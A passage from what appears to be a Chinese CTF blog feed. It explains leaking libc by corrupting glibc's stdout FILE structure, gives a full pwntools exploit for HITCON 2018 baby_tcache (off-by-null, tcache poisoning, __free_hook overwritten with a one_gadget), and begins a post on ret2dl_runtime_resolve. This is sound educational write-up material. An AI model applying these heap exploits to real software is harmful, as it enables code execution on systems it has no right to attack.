f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的最终的目的就是通过<code>_IO_do_write</code>来泄露<code>libc</code>，那要到达这个分支，需要绕过如下判断：</p><ol><li><code> if (f-&gt;_flags &amp; _IO_NO_WRITES)</code></li><li><code> if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</code></li></ol><p>上面两个分支都是避免进入的，我们只要进入<code>if (ch == EOF)</code>这个判断里面，查找一些宏定义之后就可以算出<code>flag</code>的值了，以后只要用这个<code>flag</code>的值就能进入 <code>_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</code>这个分支了：</p><blockquote><p><code>_flags = 0xfbad0000 </code><br><code>_flags &amp;= ~_IO_NO_WRITES  ==&gt; _flags = 0xfbad0000 </code><br><code>_flags |= _IO_CURRENTLY_PUTTING ==&gt; _flags = 0xfbad0800</code></p></blockquote><p>既然能正常进入<code>_IO_do_write</code>，我们进去看看，发现有个<code>if &#123;&#125; else if&#123;&#125;</code>，这会绕不过了，只能看看进到那个分支里面对结果影响小，其实不用说，一看<code>fp-&gt;_offset = _IO_pos_BAD;</code>的影响就小，毕竟就一条语句，下面那个分支就很危险了，这里引用其他大佬的一段话：</p><blockquote><p>这条分支我们尽可能的不碰，原因有两点：</p><p>第一，其实只要满足判断中的条件<code>fp-&gt;_IO_read_end = fp-&gt;_IO_write_base</code>即可绕过这里的判断，使之相等的操作并不是没有可能，但是在实际操作中实现的几率比较小。一般在做这种题的时候都会伴随着随机化保护的开启，进行攻击的时候，我们一般采用的都是覆盖末位字节的方式造成偏移，因为即使随机化偏移也会存在0x1000对齐。但是这时候就会遇到一个很尴尬的情况，<code>_IO_read_end</code>和<code>_IO_write_base</code>存放的地址是由末位字节和其他高字节共同组成的，其他高字节由于随机化的缘故无法确定，所以何谈使两个成员变量中的地址相等呢</p><p>第二，可以看到<code>else if</code>这条分支中调用了<code>_IO_SYSSEEK</code>系统调用，即<code>lssek</code>函数，如果我们将<code>_IO_read_end</code>的值设置为0，那么<code>_IO_SYSSEEK</code>的二参<code>fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>得出的数值就有可能非常大，这就会导致<code>sleek</code>函数执行不成功导致退出，这是因为载入内存的数据范围可能并不大，但是经过<code>sleek</code>函数修改过大的偏移之后超过了数据范围的边界。一旦<code>sleek</code>函数执行不成功导致退出，那么就不会到达我们想要的<code>_IO_SYSWRITE</code>系统调用了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然要使得判断成立，那就<code>|_IO_IS_APPENDING</code>它就可以了：</p><blockquote><p><code>_flags |= _IO_IS_APPENDING # _flags = 0xfbad1800</code></p></blockquote><p>所以完整的调用链为：<code>puts -&gt; IO_puts -&gt; _IO_new_file_xsputn -&gt; _IO_new_file_overflow -&gt; _IO_do_write -&gt; new_do_write -&gt; _IO_SYSWRITE</code></p><p>能够成功调用<code>_IO_SYSWRITE</code>之后还有一个问题，就是输出的大小问题，回看之前的<code>IO_FILE</code>结构体中有个叫<code>_IO_write_base;</code>，其实只要修改它的大小稍微小一点，就能输出与<code>libc</code>挨得很近的值，至于上面几个关于<code>read</code>的成员，覆盖成0就好，其实不太明白这其中的道理，猜测是为了放置它搅屎吧，设置成0简单又粗暴….</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>在比赛中有两种情况来泄露，一个是在<code>libc-2.23</code>，另一个是在<code>libc-2.27</code>下，本质就是一个用<code>fastbin</code>来劫持<code>IO_2_1_stdout</code>，一个用<code>tache</code>来劫持<code>IO_2_1_stdout</code>，<code>fastbin</code>就得找一个<code>/x7f</code>大小的堆块才能链入<code>fastbin</code>，<code>tache</code>直接修改<code>fd</code>指针即可</p><h5 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h5><p><strong>HITCON 2018 PWN baby_tcache</strong></p><p>程序简单的离谱，第一次看见只有两个选项的菜单题：</p><p><code>add</code>函数里面的<code>chunk_ptr[size] = 0;</code>存在<code>off-by-null</code>，真的是不做多点题，对漏洞的敏感度真的不高，看半天没看出来….</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *chunk_ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_list[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = read();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  chunk_ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_ptr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read_0(chunk_ptr, size);</span><br><span class="line">  chunk_ptr[size] = <span class="number">0</span>;</span><br><span class="line">  chunk_list[i] = chunk_ptr;</span><br><span class="line">  v0 = chunk_size;</span><br><span class="line">  chunk_size[i] = size;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>就没啥问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = read();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_list[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(chunk_list[v1], <span class="number">218</span>, chunk_size[v1]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[v1]);</span><br><span class="line">    chunk_list[v1] = <span class="number">0LL</span>;</span><br><span class="line">    chunk_size[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那既然有<code>off-by-null</code>，那利用的方法也就很明确了！做堆叠，做法也是十分的简单，这里就不赘述了，忘了就去看看<code>off-by-one</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(0x500)  #0</span><br><span class="line">add(0x70)    #1</span><br><span class="line">add(0x5f0)  #2</span><br><span class="line">add(0x20)         #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(0x78,&#x27;A&#x27;*0x70+p64(0x590))</span><br><span class="line"></span><br><span class="line">free(2)                </span><br></pre></td></tr></table></figure><p>堆叠完成之后，在<code>tache</code>里面链入<code>main_arena</code>，就可以修改它的后俩个比特劫持到<code>IO_2_1_stdout</code>，虽然程序开了ASLR，但它的后12个<code>bit</code>是始终不会变的，也就是说还有4个<code>bit</code>会变，那怎么办呢？只能猜一个值然后来爆破，几率为<code>1/16</code>（一开始对爆破感觉好厉害的样子，其实就是写个<code>try except</code>….）</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">opt</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(opt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)  <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x70</span>)    <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x5f0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)  <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;A&#x27;</span>)         <span class="comment">#3</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0x590</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)                </span><br><span class="line">    free(<span class="number">0</span>)                </span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;\x60\xb7&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0x0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x90&#x27;</span>) <span class="comment">#change the _flag</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    data = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = data - <span class="number">4114403</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span> <span class="comment">#0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base :&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x80</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    a = <span class="number">16</span></span><br><span class="line">    <span class="keyword">while</span>(a) :</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            p = process(<span class="string">&#x27;./baby_tcache&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)<span class="comment">#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;</span></span><br><span class="line">            elf = ELF(<span class="string">&#x27;./baby_tcache&#x27;</span>)</span><br><span class="line">            libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">            <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">            exp()</span><br><span class="line">            a -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">            <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            p.interactive()</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://bbs.pediy.com/thread-249713.htm">Tcache利用总结</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113867648?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163370995516780274138633%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163370995516780274138633&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-113867648.pc_v2_rank_blog_default&utm_term=_IO_2_1_stdout%E6%B3%84%E9%9C%B2libc&spm=1018.2226.3001.4450">HITCON 2018 PWN baby_tcache超详细讲解</a></p><p><a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/#more">IO_FILE泄露libc</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级ROP链构造方法（二）-- ret2dl_runtime_resovle</title>
      <link href="/2021/10/05/ret2dl-runtime-resovle/"/>
      <url>/2021/10/05/ret2dl-runtime-resovle/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前面已经讲完了PLT和GOT表的作用，在那儿我留了一手，并没有讲清楚<code>_dl_runtime_resolve_</code>这个函数具体实现，还记得当时程序往栈上push了两个参数就进入<code>_dl_runtime_resolve_</code>了吗？不记得可以回去翻下</p></blockquote><p>我们回忆一下当时那两个参数是什么，没错，一个是<code>0</code>，一个是<code>0x804a004</code>，这里先讲他们是啥，0呢，我们先理解成一个Index，而<code>0x804a004</code>是一个函数地址叫<code>link_map</code>，其实<code>_dl_runtime_resolve_</code>是通过<code>link_map</code>来找到<code>.dynamic</code>的</p><img src="/2021/10/05/ret2dl-runtime-resovle/1.png" class=""><p>而.<code>dynamic</code>是什么呢？我们随便拉一个程序进IDA来看，我们可以看到里面有一些结构体，其实和<code>_dl_runtime_resolve_</code>紧密相关的只有三个：<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>，<code>DT_JMPREL</code>这三个根据地址我们可以发现它们指向了<code>.dynstr</code>，<code>.dynsym</code>，<code>.rel.plt</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/5.png" class=""><p><code>link_map+0x8</code>的位置就是它要找的<code>.dynamic</code>，接下来我们再通过<code>.dynamic</code>找到<code>.dynstr</code>， <code>.dynsym</code>，`.rel.plt</p><img src="/2021/10/05/ret2dl-runtime-resovle/3.png" class=""><p><code>.dynstr</code> 的地址是 <code>.dynamic + 0x44 -&gt; 0x0804821c</code></p><p><code>.dynsym</code> 的地址是 <code>.dynamic + 0x4c -&gt; 0x080481cc</code></p><p><code>.rel.plt</code> 的地址是 <code>.dynamic + 0x84 -&gt; 0x08048298</code></p><p>我们看上面的IDA也是这个地址</p><img src="/2021/10/05/ret2dl-runtime-resovle/4.png" class=""><p>到这里另外一个<code>push</code>到栈上的参数就起作用了</p><p>将<code>.rel.plt</code> 的地址加上参数 <code>reloc_arg</code>，即<code>0x8048298+0x0 = 0x8048298</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/6.png" class=""><p>这里就是重定位表项，这里也是一个结构体，将<code>r_info&gt;&gt;8</code>，即<code>0x00000107&gt;&gt;8 = 1</code>作为<code>.dynsym</code>中的下标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Addr  r_offset;<span class="comment">//指向GOT表的指针</span></span><br><span class="line"> Elf32_Word  r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/ret2dl-runtime-resovle/7.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> Elf32_Word  st_name; <span class="comment">//符号名偏移，也就是相对.dynstr的偏移</span></span><br><span class="line"> Elf32_Addr  st_value;<span class="comment">//该字段为0</span></span><br><span class="line"> Elf32_Word  st_size;<span class="comment">//该字段为0</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//导入符号，图中是0x12</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">//该字段为0</span></span><br><span class="line"> Elf32_Section st_shndx;<span class="comment">//该字段为0</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p><code>.dynstr + st_name</code>就是这个函数的符号名字符串 </p><p><code>0x0804821c+0x1a = 0x8048236</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/8.png" class=""><p>IDA上的字符串表</p><img src="/2021/10/05/ret2dl-runtime-resovle/9.png" class=""><p>最后在动态链接库查找这个函数的地址，并且把地址赋值给<code>rel-&gt;r_offset</code>，即<code>GOT</code>表就可以了</p><p>前面已经讲解完了<code>_dl_runtime_resolve_</code>函数的执行流程，下面从源码层面来解析，不关键的代码已经删除</p><p>在进入<code>_dl_runtime_resolve_</code>函数之后它又<code>call _dl_fixup_</code></p><img src="/2021/10/05/ret2dl-runtime-resovle/10.png" class=""><p>下面是<code>_dl_fixup_</code>的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">//查找dynstr的位置</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span 